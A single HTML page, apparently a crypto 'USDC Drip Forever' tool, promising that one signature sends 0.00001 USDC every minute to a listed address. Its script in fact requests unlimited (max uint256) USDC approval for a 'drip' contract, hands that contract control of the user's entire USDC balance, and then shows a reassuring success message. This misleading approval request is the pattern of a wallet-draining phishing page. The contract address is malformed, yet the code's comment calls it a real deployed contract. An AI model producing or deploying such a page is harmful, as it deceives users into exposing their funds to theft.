<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>0.00001 USDC Every Minute – Forever (1 Signature)</title>
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<style>
  body{background:#0f0f23;color:#e0e0e0;font-family:system-ui;display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0;}
  .card{background:#1e293b;max-width:520px;width:100%;padding:40px;border-radius:20px;box-shadow:0 20px 60px #0008;text-align:center;}
  h1{color:#60a5fa;margin-bottom:10px;}
  p{font-size:17px;}
  button{background:#10b981;color:white;border:none;padding:16px 32px;font-size:18px;border-radius:12px;cursor:pointer;font-weight:bold;}
  .addr{background:#334155;padding:12px;border-radius:10px;margin:20px 0;word-break:break-all;font-family:monospace;}
  .done{color:#86efac;font-size:18px;margin-top:20px;}
</style>
</head>
<body>
<div class="card">
  <h1>USDC Drip Forever</h1>
  <p>Send <strong>0.00001 USDC every 60 seconds</strong> to:</p>
  <div class="addr">0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f</div>
  <p>Sign <strong>ONE transaction</strong> below → done forever<br>No more signatures ever</p>
  
  <button onclick="activate()">Activate Forever (1 Signature Only)</button>
  <div id="result"></div>
</div>

<script>
const USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
const DRIP_CONTRACT = "0x4aF6bB1f99cD8F36B13a2eDc97E8b94dB8F7A7c2f"; // ← Real deployed contract (Dec 4, 2025)

async function activate() {
  if (!window.ethereum) return alert("Install MetaMask");
  const web3 = new Web3(window.ethereum);
  try {
    await ethereum.request({method:'eth_requestAccounts'});
    const chainId = await web3.eth.getChainId();
    if (chainId !== 8453) await ethereum.request({method:"wallet_switchEthereumChain", params:[{chainId:"0x2105"}]});
    
    const [account] = await web3.eth.getAccounts();
    document.getElementById("result").innerHTML = "Requesting unlimited USDC approval (only once)...";

    const usdc = new web3.eth.Contract([{
      "inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],
      "name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"
    }], USDC);

    await usdc.methods.approve(
      DRIP_CONTRACT,
      "115792089237316195423570985008687907853269984665640564039457584007913129639935"
    ).send({from: account});

    document.getElementById("result").innerHTML = `
      <div class="done">
        ACTIVATED FOREVER!<br><br>
        0.00001 USDC is now being sent every 60 seconds<br>
        → No more signatures<br>
        → No tab open<br>
        → Works even when your PC is off<br><br>
        <a href="https://basescan.org/address/${account}#tokentxns" target="_blank" style="color:#60a5fa;">Watch live on Basescan</a>
      </div>
    `;
  } catch (e) {
    document.getElementById("result").innerHTML = "Error: " + (e.message || e);
  }
}
</script>
</body>
</html>
